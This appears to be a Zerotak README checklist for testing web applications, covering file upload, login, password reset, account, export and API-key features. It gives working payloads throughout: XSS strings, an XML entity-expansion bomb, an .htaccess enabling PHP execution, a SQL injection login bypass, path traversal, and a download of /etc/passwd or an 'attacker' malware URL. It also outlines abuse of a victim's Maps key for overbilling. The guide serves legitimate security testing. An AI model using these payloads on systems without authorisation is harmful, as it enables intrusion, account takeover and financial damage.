<h1 align="center"> DIY Web Penetration Testing</h1>
<p align="center"><b> Version: 1.0 </b></p>


<p align="center">Do It Yourself! (DIY) Web Penetration Testing is a guideline in performing security test cases against web applications <br></p>

<p align="center">The guide is split on web components, each of those contains specific testing steps that could unveil potential vulnerabilities.</p>

</p>
<br>
<p align="center">
   <img src="https://zerotak.com/wp-content/uploads/2022/10/zerotak_home-header-img.png"></img><br>
   <h3 align="center">Brought to you by <a href="https://zerotak.com">Zerotak</a></h3>
</p>
<br>
<h2>This guide is for:</h2> 

:sunglasses: Pentesters

:sunglasses: Developers who want to strengthen the security of their applications


:sunglasses: QA testers who want to include security test cases within their methodology

:sunglasses: Security enthusiasts

:sunglasses: Everyone else


<h2> This guide is NOT for:</h2>

:no_entry: Those who do not care about the security of their applications

:no_entry: Those who think that they are not a target for cyber criminals

:no_entry: Those who think that their webapps are 100% safe

:no_entry: Those who think they know everything


<br><br>
Table of Contents
=================

* [File Upload](#file-upload)
   * [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
   * [Web Shells](#web-shells)
   * [XML External Entities Injection](#xml-external-entities-injection)
   * [Malicious File Upload](#malicious-file-upload)
   * [File Storage Attacks](#file-storage-attacks)
   * [Client-Side Validation Bypass](#client-side-validation-bypass)
   * [SQL Injection](#sql-injection)
   * [GDPR/Privacy Issues](#gdprprivacy-issues)
* [Login/Register Page](#loginregister-page)
   * [Username Enumeration](#username-enumeration)
   * [SQL Injection](#sql-injection-1)
   * [Mass Assignment](#mass-assignment)
   * [Credential Stuffing](#credential-stuffing)
   * [Unvalidated Redirect](#unvalidated-redirect)
   * [Brute-Force](#brute-force)
   * [Weak/Common Passwords](#weakcommon-passwords)
   * [Session Fixation](#session-fixation)
* [Forgot Password Function](#forgot-password-function)
   * [Account Takeover](#account-takeover)
   * [Persistent Forgot Password Token](#persistent-forgot-password-token)
   * [Cross-Site Scripting (XSS)](#cross-site-scripting-xss-1)
   * [Missing Checks on Password Reset Token](#missing-checks-on-password-reset-token)
   * [Predictable Reset Password Token](#predictable-reset-password-token)
* [My Account](#my-account)
   * [Missing Old Password Validation](#missing-old-password-validation)
   * [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
   * [Account Takeover](#account-takeover-1)
   * [Sensitive Information Disclosure](#sensitive-information-disclosure)
* [Logout](#logout)
   * [Missing Session Expiration](#missing-session-expiration)
   * [Unvalidated Redirect](#unvalidated-redirect-1)
* [Export Function](#export-function)
   * [Formula Injection](#formula-injection)
   * [Application Denial-of-Service (DoS)](#application-denial-of-service-dos)
   * [Insecure Storage of Exports](#insecure-storage-of-exports)
   * [Arbitrary File Download](#arbitrary-file-download)
* [Google Maps](#google-maps)
   * [Abuse of Google Maps API Key for Financial Damage](#abuse-of-google-maps-api-key-for-financial-damage)
* [API Keys Management Page](#api-keys-management-page)
   * [Private Key Disclosure](#private-key-disclosure)
   * [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor-1)
   * [Persistent API Keys](#persistent-api-keys)
* [To Do](#to-do)

  <br><br>

# File Upload

## Cross-Site Scripting (XSS)

1. Upload file containing JavaScript (XSS) payload - usually HTML extensions
```
<script>alert()</script>
```
3. Upload PDF file<br>

https://github.com/luigigubello/PayloadsAllThePDFs/blob/main/PDF%20Files/payload1.pdf


4. Upload ```.SVG, .XML, .XSD, .XMP, .XSLT, .XHTML``` Files:
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="300"
   height="200">

  <image
 	x="10"
 	y="10"
 	width="276"
 	height="110"
 	xlink:href="https://google.com"
 	stroke-width="1"
 	id="image3204" />
  <rect
 	x="0"
 	y="150"
 	height="10"
 	width="300"
 	style="fill: black"/>
<script>alert()</script>
</svg>
```
4. Compile and Upload SWF file: <br>

Create an ActionScript file (.as) with the below source code and compile it with ```mtasc -swf asd.swf -main -header 0:0:0 test.as``` (Source: https://github.com/ncannasse/mtasc)

```
class XSS {
   	 static var app: XSS;
   	 function XSS() {
   	 var xss = "javascript:alert(\"That's a cool XSS\")";
   	 getURL(xss, "_self");
   	 }
   	 static function main(mc) {
   	 app = new XSS();
}}

```
5.Upload GIF file:
```
GIF89a/<svg/onload=alert(1)>/=alert(document.domain)//;
```

6.  Upload file with XSS payload within its name
```
image.jpeg -> image'"><script>alert()</script>.jpeg
```


6. Upload file with XSS payload within metadata
```
exiftool -Comment='"><script>alert()</script> image.jpg
```


## Web Shells
Where to get them from: https://github.com/BlackArch/webshells


## XML External Entities Injection

Upload ```.SVG, .XML, .XSD, .XMP, .XSLT, .XHTML``` files with payloads

https://github.com/payloadbox/xxe-injection-payload-list

If ```SYSTEM``` entity is restricted, then try Billion Laughs attack for Application Denial-of-Service (DoS)

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Malicious File Upload

1. Upload an Anti Malware Testfile - EICAR (will not do any harm if executed, but it is detected by almost all anti-virus vendors) in order to check if there is an anti-virus check before storing the file

Link: https://www.eicar.org/download-anti-malware-testfile/

2. If .EXE is not allowed, try to upload the allowed file extension (e.g. .PDF) with the content of the EICAR file

3. Upload files containing malicious macros (DOCM, CSV, etc.)

## File Storage Attacks

1. Upload a file within the account/storage of another user<br>


Possible options:


  a. Through IDOR (change URL/Data parameters when uploading the file)<br>


  b. Through manipulation of the folder where the file is located. Upload file with the following filename:<br>
```
../bob_folder/image.jpg
```

2. Upload a file with big size or achives containing huge files -> Check for Storage-based Denial-of-Service (DoS) or Overbill if the storage has auto-scaling.<br>

Alternatively, split the file in multiple chunks (```image1.jpg```, ```image2.jpg```, and so on) and upload them
<br>

3. Upload a file with the name of an existing file -> check if overwritting is possible. Example of an ```.htaccess``` to allow execution of PHP file ```rce.php```:
```
<Files ~ "^\.php">
Require all granted
    Order allow,deny
    Allow from all
</Files>

AddType application/x-httpd-php rce.php
```
4. Check if uploaded file can be accessed without authentication (Missing Authentication) or by other users (Broken Access Controls)

5. Upload file containing a long name -> trigger logical issues or verbose errors
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpeg
```
6. Delete files uploaded by other users through Insecure Direct Object Reference (IDOR) or Cross-Site Request Forgery (CSRF) with a forged link.


 
## Client-Side Validation Bypass

1. Set up a listener proxy using Burp Suite
2. Upload an allowed file, for example ```image.jpg```
3. Intercept the request
4. Modify the following parameters:
```
Filename
Content-Type
Content of file

``` 

## SQL Injection
Upload a file containing SQLi payloads within its name
```
image.jpeg' or '1'='1
```


## GDPR/Privacy Issues

Check if the metadata is stripped from the file:
```
exiftool image.jpeg
```

# Login/Register Page
## Username Enumeration

1. Through error message

Invalid Username & Invalid Password:
```
Username was not found
```

Valid Username & Invalid Password:

```
Incorrect password
```


2. Through response size discrepancy:

Invalid Username & Invalid Password: ```Response size: 20KB ``` (example)


Valid Username & Invalid Password (same password as above): ```Response size: 150KB``` (example)



3.  Through response time discrepancy:

Invalid Username & Invalid Password: ```Response time: 5,000 ms``` (example)


Valid Username & Invalid Password (same password as above): ```Response time: 100 ms``` (example) 

## SQL Injection

```
SELECT * FROM USERS WHERE username = '<user input>' and password = '<password input>';
```
That is one of the classic and very vulnerable queries for a login page

Insert the following username to bypass authentication: ```admin' or '1'='1'-- -```


## Mass Assignment

1. Set up a proxy listener using Burp Suite
2. Capture the request sent as a login: ```username=zerotak&password=test```
3. Add another ```username``` parameter with the target account, for example: ```username=zerotak&username=admin&password=test```
4. You will (probably) be logged into the ```admin``` account. This heavily depends on how the application processes the post-login session.

## Credential Stuffing

Check data breaches for any exposed credentials that can be used to compromise accounts. Such platform can be <a href="https://intelx.io">IntelX.io</a> (free trial for 7 days)


## Unvalidated Redirect

If the application hardcodes a value that the user will be redirected after login through a GET parameter (such as ```?redirect_url=```):
```
https://vulnerable-target/login/?redirect_url=https://phishing-website --> For Open Redirect after login
https://vulnerable-target/login/?redirect_url=javascript:alert()  --> For Cross-Site Scripting (XSS) after login
```


## Brute-Force

Use Burp Suite's Intruder to test if after 100 failed (or another treshold) failed login attempts, there will be accepted a valid login.

## Weak/Common Passwords
1. Register an account with blank password -> Null password accepted
2. Register an account with ```a``` or ```1``` as a password -> Missing Password Policy
3. Register an account with ```123456789``` or ```asd12345``` as a password -> Weak Password Policy
4. Register an account with the same username and password (e.g. ```zerotak:zerotak```) -> Weak Password Policy
5. Register an account with ```P@ssw0rd``` as a password -> Common Passwords Accepted

## Session Fixation
1. Set up your session cookie (unauthenticated) with the value of ```pentest```
2. Log into the application
3. Open another browser/computer and insert the session cookie with the ```pentest``` value
4. Are you authenticated? If yes, then it is a ```Session Fixation``` vulnerability


# Forgot Password Function
All vulnerabilities and test cases from previous section should be applied here too. Besides those below you will find specific attacks on Forgot Password pages and features.

## Account Takeover
1. Through reset password token disclosed in response
2. Through Host Header Injection

Modify the ```Host:``` request header to match your listener's hostname/IP address (Burp Collaborator can be used here). The reset token can be transmitted to your controlled listener.



## Persistent Forgot Password Token
1. Check if the forgot password token can be used after a long period of time (e.g. 1-2 weeks)
2. Check if the forgot password token can be still used after its first usage (Missing Invalidation)


## Cross-Site Scripting (XSS)
Usually, the reset token is provided within the email as a GET request with a corresponding URL parameter. This parameter is a hidden form input within the page. Inject XSS payloads here:

```
https://vulnerable-target/reset-password/?token='"><img src=x onerror=alert()></img>
```

## Missing Checks on Password Reset Token

1. Can you change your password without any password reset token?
2. Can you change the password of another account with your password reset token?

## Predictable Reset Password Token

1. Send a reset password request in the same time for two different accounts owned by you
2. Copy and inspect the password reset tokens
3. Analyze them for any predictable components. You can take in consideration the following: ```timestamp``` ```usernames``` ```email```



# My Account

## Missing Old Password Validation
Check if the password change feature within My Account page contains a check for the Old/Current Password.

Can be coupled with ```Cross-Site Request Forgery``` (One click-interaction account takeover).

```
GET /change-password/?new_password=<arbitrary value>
```



## Insecure Direct Object Reference (IDOR)

Example of request to pull your account's details:

```
GET /my-account/?userID=1234
```
Retrieve other account's details:

```
GET /my-account/?userID=1235
```


## Account Takeover
Check if you can tamper with the ```username``` parameter while performing the authenticated password change.



## Sensitive Information Disclosure
Check the response from the API if it contains more information about your account than the UI. For example, we had a scenario where the API responded with the full password hash of the account.


# Logout

## Missing Session Expiration
1. Copy your session cookie (authenticated)
2. Logout
3. Use the previously copied cookie value within the browser
4. Are you authenticated?

## Unvalidated Redirect
Same as ```Login/Register``` but the endpoint may differ. The impact here would be higher because there is no additional interaction (if coupled with CSRF).


# Export Function

## Formula Injection
1. Check if the application allows CSV or XLS format export of data contained within its pages (for XLSX is not applicable!)
2. Insert a formula through the web application:
```
=1+1
+1+1
-1+1
@1+1
```
3. Export and check if the formula was reflected in the exported file

For some applications, the export function adds another character in front of the formula (such as a ```'```). In that case you should insert a separator to bypass the mechanism:

```
,=1+1
,+1+1
,-1+1
,@1+1
```


## Application Denial-of-Service (DoS)
Try requesting multiple exports of huge amounts of information from the application in the same time. Can be done using Burp Suite's intruder functionality.


## Insecure Storage of Exports
If the exports are stored Server-Side, please check the ```File Storage Attacks``` sub-section within the ```File Upload``` section.

## Arbitrary File Download
1. Request an export
2. The application will download a CSV/XLS file and reflect its name within a GET/POST parameter
3. Capture the request (using Burp Suite)
4. Change the filename to reference an internal name, such as ```/etc/passwd``` or an external malicious name, such as ```https://attacker/malware.exe```.


# Google Maps

## Abuse of Google Maps API Key for Financial Damage

1. Navigate through the application until you reach a page where Google Maps are displayed
2. Check the requests using Network tab from Browser's Web Developer Tools
3. Identify the requests going to ```maps.googleapis.com``` and capture the value of the ```key``` parameter (format: ```AIza...```)
4. Use the script here: https://github.com/ozguralp/gmapsapiscanner to check if the token can be used outside of the application
5. If yes, then you can create an automated script to send a lot of requests using victim's token, in order to consume the quota and potentially produce an overbill



# API Keys Management Page

## Private Key Disclosure
For applications that use a combination of ```public``` and ```private``` API keys, the ```private``` key is disclosed only when the pair is created. 

However, you can test if this ```private``` API Key is being disclosed within the response of the application (through the API itself).

## Insecure Direct Object Reference (IDOR)
1. Navigate to the page where the API keys are managed
2. Intercept the request
3. If the API keys are being created/pulled based on a GET/POST parameter, then interact with that parameter. Example:

API Tokens of User A (attacker):
```
POST /api-key

userID=1234
```

Create a pair of API tokens for User B (victim):
```
POST /api-key

userID=1235
```

## Persistent API Keys

Check if the API keys can be used even after the removal of them from the account.

<br>




# To Do:

- [ ] Markdown Editor Pages
- [ ] Financial-related Functions
- [ ] Chat/Messages
- [ ] Blog Posts
- [ ] Contact Forms
- [ ] Users Management Page








 

 


